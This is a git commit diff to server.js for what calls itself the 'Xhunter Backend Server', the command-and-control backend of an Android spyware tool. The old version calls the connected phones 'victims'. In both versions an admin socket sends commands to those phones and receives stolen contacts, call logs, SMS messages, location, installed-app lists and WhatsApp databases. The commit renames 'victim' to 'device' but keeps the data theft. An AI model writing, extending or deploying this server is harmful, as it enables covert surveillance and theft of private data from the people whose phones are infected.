9794b75624bc5ae9df745f9215cc460f9dec986e
issa261 <68721191+issa261@users.noreply.github.com>
2025-09-19 01:18:33 +0300

    Update server.js

--- server.js
+++ server.js
@@ -1,77 +1,66 @@
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
-const path = require('path');
 const cors = require('cors');
+const path = require('path');
 
 const app = express();
 const server = http.createServer(app);
-const io = new Server(server, { maxHttpBufferSize: 1e8, cors: { origin: "*", methods: ["GET","POST"] } });
+
+app.use(cors());
+const io = new Server(server, {
+  maxHttpBufferSize: 1e8,
+  cors: { origin: "*", methods: ["GET","POST"], credentials: true }
+});
 
 const port = process.env.PORT || 8080;
+server.listen(port, () => console.log(`[LOG] Server running on port ${port}`));
 
 let adminSocketId = null;
-let victimList = {};
-let victimData = {};
-let deviceList = {};
+let devices = {};
 
-const log = (msg) => console.log(`[LOG] ${msg}`);
-
-// تمكين CORS
-app.use(cors());
 app.use(express.static(path.join(__dirname, 'public')));
-app.get('/', (req,res)=> res.send('Welcome to Xhunter Backend Server!!'));
-
-server.listen(port, () => log(`Server running on port ${port}`));
+app.get('/', (req,res) => res.send('Welcome to Xhunter Backend Server!'));
 
 io.on('connection', (socket) => {
-  // المدير
+  console.log(`[LOG] Socket connected: ${socket.id}`);
+
+  // Admin joins
   socket.on('adminJoin', () => {
     adminSocketId = socket.id;
-    Object.values(victimData).forEach(d => socket.emit('join', d));
-    log(`Admin connected: ${socket.id}`);
+    Object.values(devices).forEach(d => socket.emit('join', d));
+    console.log(`[LOG] Admin connected: ${socket.id}`);
   });
 
-  // العميل
+  // Client joins
   socket.on('join', (device) => {
-    victimList[device.id] = socket.id;
-    victimData[device.id] = { ...device, socketId: socket.id };
-    deviceList[socket.id] = { id: device.id, model: device.model };
-    socket.broadcast.emit('join', { ...device, socketId: socket.id });
-    if(adminSocketId) io.to(adminSocketId).emit('join', { ...device, socketId: socket.id });
-    log(`Device joined: ${device.id}`);
+    devices[device.id] = { ...device, socketId: socket.id };
+    if(adminSocketId) io.to(adminSocketId).emit('join', devices[device.id]);
+    console.log(`[LOG] Device joined: ${device.id}`);
   });
 
-  // طلبات المدير
-  socket.on('request', (d) => {
-    const { to, action, data } = JSON.parse(d);
-    if(victimList[to]) io.to(victimList[to]).emit(action, data);
-    log(`Request: ${action} -> ${to}`);
+  // Admin sends command
+  socket.on('request', (msg) => {
+    const { to, action, data } = JSON.parse(msg);
+    if(devices[to]) io.to(devices[to].socketId).emit(action, data);
+    console.log(`[LOG] Request: ${action} -> ${to}`);
   });
 
-  const sendResponse = (action, data) => { if(adminSocketId) io.to(adminSocketId).emit(action, data); };
-  const sendBinaryResponse = (action, data, callback) => { if(adminSocketId){ if(callback) callback('success'); io.to(adminSocketId).emit(action,data); } };
-
-  const victimEvents = ['getDir','getInstalledApps','getContacts','sendSMS','getCallLog','previewImage','getSMS','getLocation','download','downloadWhatsappDatabase'];
-
-  victimEvents.forEach(ev => {
-    socket.on(ev, (data, callback) => {
-      if(callback) sendBinaryResponse(ev,data,callback);
-      else sendResponse(ev,data);
+  // Client sends data
+  const deviceEvents = ['getInstalledApps','getContacts','getCallLog','getSMS','getLocation','downloadWhatsappDatabase'];
+  deviceEvents.forEach(ev => {
+    socket.on(ev, (data) => {
+      if(adminSocketId) io.to(adminSocketId).emit(ev, data);
+      console.log(`[DATA] ${ev} from ${socket.id}`);
     });
   });
 
+  // Disconnect
   socket.on('disconnect', () => {
-    if(socket.id === adminSocketId) adminSocketId = null;
-    else {
-      sendResponse('disconnectClient', socket.id);
-      Object.keys(victimList).forEach(k => {
-        if(victimList[k] === socket.id){
-          delete victimList[k];
-          delete victimData[k];
-        }
-      });
-    }
-    log(`Socket disconnected: ${socket.id}`);
+    Object.keys(devices).forEach(id => {
+      if(devices[id].socketId === socket.id) delete devices[id];
+    });
+    if(adminSocketId) io.to(adminSocketId).emit('updateDevices', devices);
+    console.log(`[LOG] Socket disconnected: ${socket.id}`);
   });
 });
